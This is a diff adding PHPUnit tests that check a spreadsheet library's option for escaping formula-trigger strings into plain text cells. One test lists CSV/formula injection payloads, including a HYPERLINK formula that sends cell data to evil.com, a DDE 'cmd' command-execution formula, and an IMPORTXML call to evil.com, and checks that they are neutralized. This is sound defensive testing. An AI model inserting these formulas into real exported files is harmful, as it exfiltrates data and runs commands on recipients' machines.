@@ -257,4 +257,77 @@ final class CellTest extends TestCase
         self::assertSame($interval2, $newCell->getValue());
         self::assertSame($interval1, $cell->getValue());
     }
+
+    public function testEscapeFormulasPreventFormulaCell(): void
+    {
+        // Without escapeFormulas (default), strings starting with = become FormulaCell
+        self::assertInstanceOf(FormulaCell::class, Cell::fromValue('=SUM(A1:A2)'));
+        self::assertInstanceOf(FormulaCell::class, Cell::fromValue('=SUM(A1:A2)', escapeFormulas: false));
+
+        // With escapeFormulas=true, strings starting with = become StringCell
+        self::assertInstanceOf(StringCell::class, Cell::fromValue('=SUM(A1:A2)', escapeFormulas: true));
+        self::assertSame('=SUM(A1:A2)', Cell::fromValue('=SUM(A1:A2)', escapeFormulas: true)->getValue());
+    }
+
+    public function testEscapeFormulasPreservesOtherCellTypes(): void
+    {
+        // Numeric cells should remain unchanged
+        self::assertInstanceOf(NumericCell::class, Cell::fromValue(42, escapeFormulas: true));
+        self::assertInstanceOf(NumericCell::class, Cell::fromValue(3.14, escapeFormulas: true));
+
+        // Boolean cells should remain unchanged
+        self::assertInstanceOf(BooleanCell::class, Cell::fromValue(true, escapeFormulas: true));
+        self::assertInstanceOf(BooleanCell::class, Cell::fromValue(false, escapeFormulas: true));
+
+        // Empty cells should remain unchanged
+        self::assertInstanceOf(EmptyCell::class, Cell::fromValue(null, escapeFormulas: true));
+        self::assertInstanceOf(EmptyCell::class, Cell::fromValue('', escapeFormulas: true));
+
+        // Date cells should remain unchanged
+        self::assertInstanceOf(DateTimeCell::class, Cell::fromValue(new DateTimeImmutable(), escapeFormulas: true));
+        self::assertInstanceOf(DateIntervalCell::class, Cell::fromValue(new DateInterval('P1D'), escapeFormulas: true));
+
+        // Regular strings should remain StringCell
+        self::assertInstanceOf(StringCell::class, Cell::fromValue('Hello World', escapeFormulas: true));
+    }
+
+    public function testIsFormulaTriggerDetectsAllTriggerCharacters(): void
+    {
+        // All documented formula trigger characters
+        self::assertTrue(Cell::isFormulaTrigger('=SUM(A1)'));
+        self::assertTrue(Cell::isFormulaTrigger('+100'));
+        self::assertTrue(Cell::isFormulaTrigger('-50'));
+        self::assertTrue(Cell::isFormulaTrigger('@username'));
+        self::assertTrue(Cell::isFormulaTrigger("\tTab prefixed"));
+        self::assertTrue(Cell::isFormulaTrigger("\rCarriage return prefixed"));
+
+        // Non-trigger strings
+        self::assertFalse(Cell::isFormulaTrigger(''));
+        self::assertFalse(Cell::isFormulaTrigger('Hello'));
+        self::assertFalse(Cell::isFormulaTrigger('123'));
+        self::assertFalse(Cell::isFormulaTrigger(' =Not a formula'));
+    }
+
+    /**
+     * Tests that common formula injection attack patterns are neutralized.
+     *
+     * @see https://owasp.org/www-community/attacks/CSV_Injection
+     */
+    public function testFormulaInjectionAttackPatternsAreNeutralized(): void
+    {
+        $attackPatterns = [
+            '=HYPERLINK("http://evil.com/steal?data="&A1,"Click here")',
+            '=cmd|"/C calc"!A0',
+            '+cmd|"/C calc"!A0',
+            '-cmd|"/C calc"!A0',
+            '@SUM(A1:A2)',
+            "=IMPORTXML(\"http://evil.com\",\"//a\")",
+        ];
+
+        foreach ($attackPatterns as $pattern) {
+            $cell = Cell::fromValue($pattern, escapeFormulas: true);
+            self::assertInstanceOf(StringCell::class, $cell, "Attack pattern should become StringCell: {$pattern}");
+            self::assertSame($pattern, $cell->getValue(), "Attack pattern value should be preserved as literal text: {$pattern}");
+        }
+    }
 }
